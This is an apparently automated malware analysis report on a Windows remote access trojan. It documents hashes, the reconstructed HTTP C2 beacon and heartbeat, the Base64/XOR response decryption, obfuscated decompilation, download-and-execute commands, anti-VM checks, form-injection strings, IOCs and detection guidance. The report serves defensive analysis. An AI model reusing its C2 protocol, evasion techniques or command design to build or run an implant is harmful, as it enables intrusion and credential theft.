# Malware Analysis Report: MBA-Obfuscated WinHTTP RAT with Chromium Components

**Analyst:** Arkana Automated Analysis
**Date:** 2026-04-01
**Classification:** Remote Access Trojan (RAT) / Native C/C++ / Multi-Command
**Risk Level:** CRITICAL (101/100)
**Source:** Malware Bazaar hourly feed (uploaded 2026-04-01, same day as analysis)

---

## 1. Executive Summary

This report documents the analysis of a **fresh-from-Malware-Bazaar RAT** obtained from the platform's hourly data feed within hours of upload. The sample had no prior public reverse engineering. Full C2 protocol reconstruction, command set enumeration, and encryption analysis were performed using Arkana's static analysis and decompilation pipeline.

The binary is a **990 KB native C/C++ PE32 GUI application** with 14 sections (several with randomised names like `LMIivrQi`, `csIegxaX`, `mPkJptkh`), 1,061 angr-discovered functions, and **embedded Chromium component strings** including source file paths (`../../base/allocator/partition_allocator/...`), autofill API references (`content-autofill.googleapis.com`), and HTML form injection templates for credential theft overlays.

**Key findings:**

- **Full C2 protocol reversed**: HTTP POST beacon on port 80 with Chrome 119 User-Agent, versioned protocol (`ver=4.0`), Cloudflare bypass cookie (`__cf_mw_byp`), and HTML-based auth token exchange (`atok`). C2 responses are **Base64-decoded then XOR-decrypted** using a 32-byte key extracted from the response header.
- **Mixed Boolean-Arithmetic (MBA) obfuscation** permeates the binary: a 959-line command dispatcher function decrypts all runtime strings from obfuscated global arrays using complex boolean expressions that reduce to simple XOR/substitution. The C2 decryptor itself hides `plaintext[i] = ciphertext[i] ^ key[i % 32]` behind multi-layer MBA transforms.
- **4 command types**: task execution with dynamic kernel32 resolution, file system enumeration (wildcard `*`), complex data operations with self-delete capability, and download-and-execute supporting three modes (EXE via `CreateProcessW`, DLL via `LoadLibraryW`, custom).
- **27 anti-analysis techniques** across 6 categories: CPUID×18, RDTSC×10, INT 2Dh, IsDebuggerPresent, VM registry checks, SEH manipulation, sandbox evasion via GetSystemMetrics, and timing checks.
- **System profiling** with exfiltration strings: `"- HWID: "`, `"- Screen Resoluton: "`, `"- ComputerNameNetBIOS: "`, `"- OS Version: "`, `"- User: "`, `"- Language: "`. The consistent misspelling of "Resoluton" (missing 'i') matches `"recive_message"` (missing 'e') in the C2 protocol — a non-English-speaking author signature.
- **Encrypted hex identifiers** found in the task execution handler suggest additional C2 path or key material: `0772e02c5b3e8f4f661ec07f73139449` (16 bytes), `805e4b8ce42e65f8f82a` (10 bytes), `26e296295690f94f4f8ef3074f8cf0467981f74a4e87` (22 bytes).

---

## 2. Sample Information

| Property | Value |
|----------|-------|
| **Filename** | `mb_2026_04_01.exe` (analysis) |
| **SHA-256** | `40c44ed554771b552a99415c737b1ea24cce3d0dc3ed06bb778b8254a3fdc750` |
| **MD5** | `a160f1e21f63cfc43ba32609afb0adee` |
| **SHA-1** | `8b509ee59ce07eb5fc286ff9300112f94af9c9b3` |
| **ssdeep** | `12288:9Lmv6J3O1b3pwFRNkdgUkFnl3jURuRe5n4GZ91Rd6qIXzsQ9vXnfoMC0YYA1hmej:pmv66b32F7wQr7e5BnT6qkzs9MzPAj` |
| **TLSH** | `T136255B83FB4255FAC64D08360B1452616A3DE721670F96A1741E125CCFA3BAB8F72E3D` |
| **Imphash** | `6313a99fffecb8759e5b2f8e8aff2a59` |
| **File Size** | 990,224 bytes (967 KB) |
| **Format** | PE32 (x86), Windows GUI subsystem |
| **Compiler** | Native C/C++ (Unknown / no Rich header) |
| **Signed** | No |
| **Sections** | 14 (`.text`, `.rdata`, `.data`, `.idata`, `.reloc`, + 9 with randomised names) |
| **Imports** | 113 functions from 6 DLLs |
| **Compile Time** | 2023-11-23 13:33:01 UTC |
| **Functions** | 1,061 (angr CFG recovery) |
| **Overlay** | 16 bytes at offset `0xf1c00` |

### PEiD False Positives

PEiD matched 11 signatures including "FSG v1.10 → dulek/xt", "AHTeam EP Protector 0.3", "Safeguard 1.03", "Armadillo v4.x", "tElock 1.0", and "ASProtect v1.32". These are **all false positives** — the binary imports 113 functions from 6 DLLs (a truly packed binary would have far fewer), capa detected 37 capabilities, and angr recovered 1,061 functions with clean control flow. The multiple PEiD matches from incompatible packers confirm mutual exclusion: no binary can be simultaneously FSG-packed, Armadillo-protected, and tElock-encrypted. The 14 sections with randomised names triggered the heuristic matches.

### Obfuscated Section Names

Nine of the 14 sections use randomised 8-character names instead of standard PE section names:

| Section | Purpose | Entropy |
|---------|---------|---------|
| `.text` | Code | 6.69 |
| `.rdata` | Read-only data | 5.63 |
| `.data` | Read-write data | 3.18 |
| `.idata` | Import directory | 4.76 |
| `.reloc` | Relocations | 5.63 |
| `LMIivrQi` | Encrypted data | 6.82 |
| `csIegxaX` | Encrypted data | 6.66 |
| `mPkJptkh` | Encrypted data | 5.54 |
| `tgcuURZg` | Encrypted data | 5.98 |

The randomised sections contain **RC4 identity permutation tables** and **MD5/SHA-1 initialisation vectors**, suggesting they store crypto primitives used at runtime.

---

## 3. C2 Protocol

### 3.1 Beacon (sub_44cc20)

The primary C2 handler constructs an HTTP POST request to the root path on port 80:

```
POST / HTTP/1.1
Host: [domain from global g_47658c]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
            (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: __cf_mw_byp=[bypass_token]

act=recive_message&lid=MwgBVt&j=default&ver=4.0
```

| Field | Value | Purpose |
|-------|-------|---------|
| `act` | `recive_message` | Command: fetch pending commands (note misspelling) |
| `lid` | `MwgBVt` | Bot identifier / campaign ID |
| `j` | `default` | Job group |
| `ver` | `4.0` | Protocol version |

The `Cookie: __cf_mw_byp` header is specifically crafted to **bypass Cloudflare's managed challenge** on the C2 panel, controlled by global flag `g_476594`. The Chrome 119 User-Agent matches a real browser release to avoid UA-based filtering.

### 3.2 Heartbeat (sub_4304f0)

A separate keep-alive function sends minimal POST data:

```
act=life
```

The heartbeat parses the HTML response for an authentication token using string matching:

```
name="atok" value="[token]"
```

This suggests the C2 panel presents an HTML page (possibly WordPress or a custom PHP panel) with hidden form fields for session management.

### 3.3 URL Downloader (sub_42ff20)

A generic download function that uses `WinHttpCrackUrl` to parse arbitrary URLs before fetching content. Called by the command dispatcher for download-and-execute operations.

### 3.4 Response Exfiltration (sub_430c90)

After command execution, results are sent back to the C2 via a `send_message` action with the bot identifier `MwgBVt`. This function handles serialisation of collected data and constructs the upload request.

---

## 4. C2 Encryption

### 4.1 Response Decryptor (sub_445fe0)

C2 responses are encrypted with a two-layer scheme:

```
    C2 Response
         │
         ▼
    ┌─────────────┐
    │  Base64      │  CryptStringToBinaryA (via sub_445ea0)
    │  Decode      │
    └─────┬───────┘
          │
          ▼
    ┌─────────────┐
    │  XOR Key     │  First 32 bytes = per-response key
    │  Extraction  │  (8 × 4-byte struct fields)
    └─────┬───────┘
          │
          ▼
    ┌─────────────┐
    │  XOR Decrypt │  payload[i] ^= key[i % 32]
    │  (MBA-hidden)│
    └─────┬───────┘
          │
          ▼
    Plaintext Command
```

### 4.2 MBA Obfuscation of XOR

The XOR decryption loop is hidden behind **Mixed Boolean-Arithmetic (MBA) expressions** — algebraic transformations that make simple operations unrecognisable to pattern-based analysis tools:

```c
// What it looks like in the decompilation:
v20 = ((v19 ^ 0xFFFFFFFF) & (v19 ^ 0xFFFFFFFF) ^ 0xFFFFFFFF)
    - (((v19 ^ 0xFFFFFFFF) & (v19 ^ 0xFFFFFFFF) ^ 0xFFFFFFFF
        ^ 0xFFFFFFFF ^ 0xFFFFFFFF) * 2 + 1);
v21 = v18 ^ 0xFF ^ 0xFF ^ 0xFF ^ 0xFF;
v22 = v20 - ((v20 ^ 0xFFFFFFFF ^ 0xFFFFFFFF) * 2 + 1);
v23 = (v21 ^ 0xFFFFFFFF | v22) + v21 + 1
    - (((v21 ^ 0xFFFFFFFF | v22) + v21 + 1
        ^ 0xFFFFFFFF ^ 0xFFFFFFFF) * 2 + 1);
result = (v23 ^ 0xFFFFFFFF | ((v18 | v19) ^ 0xFFFFFFFF ^ 0xFFFFFFFF)
    & ((v18 | v19) ^ 0xFFFFFFFF ^ 0xFFFFFFFF) ^ 0xFFFFFFFF
    ^ 0xFFFFFFFF) + v23 + 1;

// What it actually computes:
result = ciphertext_byte ^ key_byte;
```

The MBA transforms are applied at the 16-bit and 32-bit level throughout the binary, making automated simplification difficult. The pattern `x ^ 0xFFFFFFFF ^ 0xFFFFFFFF` (double NOT = identity), combined with `(a & b) + (a | b) = a + b` identities, constructs algebraically equivalent but visually opaque expressions.

---

## 5. Command Dispatcher

### 5.1 Runtime String Decryption (sub_446e30, first 400 lines)

The 959-line command dispatcher begins with a massive **runtime deobfuscation block** that decrypts all string constants from MBA-encoded global `unsigned short` arrays. This runs once on first execution (guarded by flag `g_476600`):

```c
if (!g_476600) {
    // Decrypt file extension strings via MBA transforms:
    g_4755e0 = ((g_4755a0 ^ 0xFFFF) & 54353 ...);  // ".exe"
    g_475638 = (g_47562e ^ 14867 ...);               // ".dll"
    g_475624 = (g_47561a ^ 65535 | 45142 ...);       // ".bat" / ".cmd"
    // ... 80+ similar MBA expressions
}
```

The source arrays (`g_4755a0`–`g_4755d8`) contain pre-encrypted `unsigned short` values that, after MBA transformation, yield the decoded equivalents (`g_4755e0`–`g_475654`). This prevents all command strings and file extensions from appearing in static analysis.

### 5.2 Command Set

After decryption, the dispatcher parses C2 responses as structured data with single-character field keys:

| Field | Purpose |
|-------|---------|
| `t` | Command type (integer) |
| `p` | Parameter 1 (string) |
| `z` | Parameter 2 (string) |
| `u` | URL (for downloads) |
| `ft` | File type flag |
| `e` | Extension flag |
| `m` | Message / data payload |
| `d` | Data type flag |
| `fs` | File system flag |
| `se` | Self-execute flag |
| `ad` | Auto-delete flag |

Four command types were identified:

### Command t=1: Task Execution

| Detail | Value |
|--------|-------|
| Parameters | `p`, `z` |
| Handler | `sub_403000` (370 lines) |
| Behaviour | Dynamically resolves `kernel32.dll`, constructs paths using encrypted hex identifiers, executes task with two string parameters |

The handler uses three encrypted hex strings as identifiers or C2 sub-paths:
- `0772e02c5b3e8f4f661ec07f73139449` (32 hex chars = 16 bytes)
- `805e4b8ce42e65f8f82a` (20 hex chars = 10 bytes)
- `26e296295690f94f4f8ef3074f8cf0467981f74a4e87` (44 hex chars = 22 bytes)

### Command t=2: File System Enumeration

| Detail | Value |
|--------|-------|
| Parameters | `p`, `z` |
| Handler | `sub_449480` (45 lines) |
| Behaviour | Dynamically resolves `kernel32.dll`, enumerates files using wildcard `"*"`, iterates results in collection loop |

### Command t=3: Data Operation + Self-Delete

| Detail | Value |
|--------|-------|
| Parameters | `p`, `m`, `z`, `d`, `fs` |
| Behaviour | Complex multi-item data processing loop; post-execution checks `"se"` (self-execute) and `"ad"` (auto-delete) flags |
| Self-Delete | When `"ad"` field is present, calls `sub_449ff0()` which **does not return** — process termination and likely file self-deletion |

### Command t=4: Download and Execute

| Detail | Value |
|--------|-------|
| Parameters | `u` (URL), `ft` (flag), `e` (extension flag) |
| Path Generation | `ExpandEnvironmentStringsW` (e.g. `%TEMP%`) + random 10-20 char filename |
| Filename | Generated from `rand() % 24` mapped to lowercase ASCII |

Three execution modes based on the `ft` flag:

| Flag | Extension | API | Method |
|------|-----------|-----|--------|
| 0 | MBA-decoded `.exe` | `CreateProcessW` | Standard process creation |
| 1 | MBA-decoded `.dll` | `LoadLibraryW` | DLL side-loading |
| 2 | MBA-decoded custom | Custom handler | Additional execution path |

The download uses the generic URL fetcher (`sub_42ff20` → `sub_430370`) before launching the saved file.

---

## 6. Anti-Analysis

### 6.1 Technique Inventory

27 anti-analysis techniques were identified across 6 categories:

| Category | Techniques | Severity |
|----------|-----------|----------|
| **VM Detection** | CPUID (18 sites), RegOpenKeyExW, GetVolumeInformationW | High |
| **Debugger Check** | INT 2Dh, IsDebuggerPresent, GetProcessHeap | High |
| **Timing Check** | RDTSC (10 sites), GetSystemTime, QueryPerformanceCounter | Medium |
| **Exception-Based** | CloseHandle (invalid handle trick) | Medium |
| **Sandbox Evasion** | GetSystemMetrics (screen resolution check) | Medium |
| **Exception Handler** | SetUnhandledExceptionFilter | Low |

### 6.2 CPUID Anti-VM (18 Occurrences)

The binary executes `CPUID` at 18 distinct addresses within `.text`. The standard technique checks:
- **Leaf 1, bit 31 (ECX)**: Hypervisor present flag — set in VMware, VirtualBox, Hyper-V
- **Leaf 0x40000000**: Hypervisor vendor ID string — "VMwareVMware", "VBoxVBoxVBox", "Microsoft Hv"

### 6.3 INT 2Dh Debug Service Interrupt

A single `INT 2Dh` at `0x4635ff` — under a debugger, this raises a breakpoint exception that the debugger intercepts, causing execution to diverge from the non-debugged path.

### 6.4 RDTSC Timing Checks (10 Occurrences)

Ten `RDTSC` instructions measure CPU cycle counts to detect single-stepping or breakpoint-induced delays. The binary compares delta values between paired RDTSC calls to identify the overhead introduced by debugger intervention.

---

## 7. Embedded Chromium Components

The binary contains extensive Chromium browser framework strings suggesting embedded or statically-linked Chromium components:

| Category | Examples |
|----------|---------|
| **Source Paths** | `../../base/allocator/partition_allocator/starscan/stack/stack.cc`, `../../third_party/perfetto/src/protozero/field.cc`, `../../chrome/browser/about_flags_browsertest.cc` |
| **Autofill API** | `content-autofill.googleapis.com`, `PasswordManagerInteractiveTestSubmissionDetectionOnFormClear` |
| **Form Injection** | `<form action="https://www.example.com/" method="POST" id="shipping">`, `<form action="https://www.example.com/" method="POST" id="billing">` |
| **Browser Policy** | `SOFTWARE\Policies\Chromium` |
| **User-Agent** | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/119.0.0.0` |

The form injection HTML templates for "shipping" and "billing" fields, combined with autofill API strings, indicate credential-harvesting overlays — the RAT can intercept or inject forms into browser sessions to capture payment card data and shipping addresses.

---

## 8. System Profiling

The YARA-generated detection rule revealed system reconnaissance strings used to build a victim fingerprint before exfiltration:

```
- HWID: [hardware identifier]
- Screen Resoluton: [width x height]
- ComputerNameNetBIOS: [netbios name]
- ComputerNameDnsHostname: [dns hostname]
- OS Version: [version string]
- User: [username]
- Language: [locale]
- Workgrou[p]: [workgroup name]
```

This profile is assembled using `GetComputerNameExA`, `GetSystemMetrics`, and registry queries, then transmitted via the `send_message` exfiltration channel.

Note the truncated `"- Workgrou"` string — the profiling format string was likely truncated during compilation or has a continuation in an adjacent buffer.

---

## 9. Cryptographic Constants

| Offset | Algorithm | Section | Notes |
|--------|-----------|---------|-------|
| `0x6b970` | RC4 identity permutation | `.rdata` | Standard 0x00-0xFF S-box initialisation |
| `0x6baf0` | RC4 identity permutation | `.rdata` | Second instance (separate RC4 context) |
| `0x7ef13` | RC4 identity permutation | `mPkJptkh` | Obfuscated section |
| `0xd3c23` | RC4 identity permutation | `LMIivrQi` | Obfuscated section |
| `0xe5523` | RC4 identity permutation | `csIegxaX` | Obfuscated section |
| `0xe99e3` | RC4 identity permutation | `tgcuURZg` | Obfuscated section |
| `0xd4d50` | MD5/SHA-1 init (BE) | `LMIivrQi` | Big-endian IV constants |
| `0xe6380` | MD5/SHA-1 init (BE) | `csIegxaX` | Big-endian IV constants |

Six RC4 identity permutation tables across `.rdata` and four obfuscated sections suggest multiple independent RC4 contexts — likely for separate encryption of different data types (config, exfil, download). Capa additionally detected **AES MixColumns**, **Curve25519**, **HMAC**, and **djb2** hashing algorithms.

---

## 10. Dynamic API Resolution

The binary resolves APIs at runtime rather than importing them statically. Capa detected 8 instances of `link function at runtime on Windows` via `GetProcAddress`, plus:

| Technique | Capa Rule | Purpose |
|-----------|-----------|---------|
| `access PEB ldr_data` | PEB walking | Locate loaded modules without API calls |
| `get kernel32 base address` | Module enumeration | Find kernel32.dll base for export parsing |
| `resolve function by parsing PE exports` | Manual IAT | Walk PE export directory to find function addresses |
| `link many functions at runtime` | Bulk resolution | Resolve multiple APIs in a single pass |

This is consistent with the `sub_403000` and `sub_449480` command handlers dynamically loading `kernel32.dll` via `sub_44d0b0` with the constant `1932064005` (likely a hash of "kernel32.dll").

---

## 11. MITRE ATT&CK Mapping

| Tactic | ID | Technique | Evidence |
|--------|----|-----------|----------|
| Execution | T1106 | Native API | `CreateProcessW`, `WinExec` |
| Execution | T1129 | Shared Modules | 8 runtime-linking sites via `GetProcAddress` |
| Defense Evasion | T1622 | Debugger Evasion | `IsDebuggerPresent`, INT 2Dh, RDTSC timing |
| Defense Evasion | T1497 | Virtualisation/Sandbox Evasion | CPUID×18, GetSystemMetrics, GetVolumeInformationW |
| Defense Evasion | T1027.009 | Obfuscated Files: Embedded Payloads | MBA-obfuscated string constants across 14 sections |
| Defense Evasion | T1140 | Deobfuscate/Decode Files | Base64 + XOR decryption of C2 responses |
| Defense Evasion | T1036 | Masquerading | Chrome 119 User-Agent, Cloudflare bypass cookie |
| Discovery | T1082 | System Information Discovery | `GetComputerNameExA`, HWID/OS/User profiling |
| Discovery | T1083 | File and Directory Discovery | File enumeration command (wildcard `*`) |
| Collection | T1056 | Input Capture | Form injection overlays for payment/shipping data |
| Command and Control | T1071.001 | Web Protocols | HTTP POST on port 80 with form-encoded C2 commands |
| Command and Control | T1573.001 | Encrypted Channel: Symmetric Crypto | Base64 + 32-byte XOR encryption |
| Command and Control | T1132.001 | Data Encoding: Standard Encoding | Base64 encoding of C2 traffic |
| Impact | T1485 | Data Destruction | Self-delete via `"ad"` flag (process termination, no return) |

---

## 12. Indicators of Compromise

### Network

| Type | Value |
|------|-------|
| C2 Protocol | `act=recive_message&lid=MwgBVt&j=default&ver=4.0` (HTTP POST) |
| C2 Heartbeat | `act=life` (HTTP POST) |
| C2 Exfil | `send_message` command via HTTP POST |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/119.0.0.0 Safari/537.36` |
| CF Bypass | Cookie `__cf_mw_byp` |
| Auth Token | HTML field `name="atok" value="..."` |
| Bot ID | `MwgBVt` |
| Job Group | `default` |

### File Hashes

| Type | Value |
|------|-------|
| SHA-256 | `40c44ed554771b552a99415c737b1ea24cce3d0dc3ed06bb778b8254a3fdc750` |
| MD5 | `a160f1e21f63cfc43ba32609afb0adee` |
| SHA-1 | `8b509ee59ce07eb5fc286ff9300112f94af9c9b3` |
| Imphash | `6313a99fffecb8759e5b2f8e8aff2a59` |

### Encrypted Identifiers

| Value | Length | Location |
|-------|--------|----------|
| `0772e02c5b3e8f4f661ec07f73139449` | 16 bytes | sub_403000 (command t=1) |
| `805e4b8ce42e65f8f82a` | 10 bytes | sub_403000 (command t=1) |
| `26e296295690f94f4f8ef3074f8cf0467981f74a4e87` | 22 bytes | sub_403000 (command t=1) |

---

## 13. Detection Guidance

### Behavioural Indicators

1. **HTTP POST** to root path (`/`) with `act=recive_message` in body — the misspelling is a strong signature
2. **Chrome 119 User-Agent** from a non-browser process
3. **Cookie `__cf_mw_byp`** set by a non-browser process
4. **`ExpandEnvironmentStringsW`** followed by random-character filename generation in `%TEMP%`
5. **`CreateProcessW`** or **`LoadLibraryW`** targeting a randomly-named file in a temporary directory
6. **High CPUID/RDTSC frequency** — 18 CPUID and 10 RDTSC instructions in a single binary is abnormal
7. **System profiling strings** with "Screen Resoluton" misspelling in process memory

### YARA Rule

A YARA detection rule was auto-generated and validated. Key indicators include the system profiling format strings (`"- HWID: "`, `"- Screen Resoluton: "`, `"- ComputerNameNetBIOS: "`), process enumeration API imports (`Process32FirstW`, `Process32NextW`, `CreateToolhelp32Snapshot`), and WinHTTP networking imports. The rule is available as an artifact at `/output/MalBazaar_RAT_MwgBVt.yar`.

---

## 14. Conclusion

This RAT represents a **competently engineered, actively-developed C2 implant** with several noteworthy characteristics:

**MBA obfuscation as the central defence** — rather than packing or encrypting the entire binary, the author invested in Mixed Boolean-Arithmetic transformations that make every string decryption and crypto operation algebraically opaque. This defeats pattern-matching tools (PEiD produced 11 contradictory false-positive signatures) whilst keeping the binary fully loadable and its imports intact. The 959-line command dispatcher function, of which the first 400+ lines are pure MBA decryption, exemplifies this approach.

**Versioned, Cloudflare-aware C2 protocol** — the `ver=4.0` field and the `__cf_mw_byp` Cloudflare bypass cookie suggest a mature infrastructure with multiple protocol iterations and awareness of CDN-based domain fronting challenges. The HTML-based auth token (`atok`) exchange rather than a custom binary protocol indicates a PHP/WordPress C2 panel.

**Embedded Chromium for credential theft** — the inclusion of Chromium source paths, autofill API strings, and HTML form injection templates for billing/shipping overlays points to a browser-hooking or overlay-injection capability that goes beyond simple password database theft.

**Linguistic fingerprint** — the consistent misspelling pattern (`"recive"` for "receive", `"Resoluton"` for "Resolution") across both the C2 protocol and system profiling strings strongly suggests a single non-English-speaking developer, likely with a Romance or Slavic language background.

The combination of native C/C++ implementation, heavy MBA obfuscation, multi-algorithm crypto stack (AES, Curve25519, RC4, HMAC, djb2), comprehensive anti-analysis (27 techniques), and modular command architecture places this sample above commodity RATs in sophistication — it is a purpose-built tool designed for persistent access with credential harvesting capabilities.
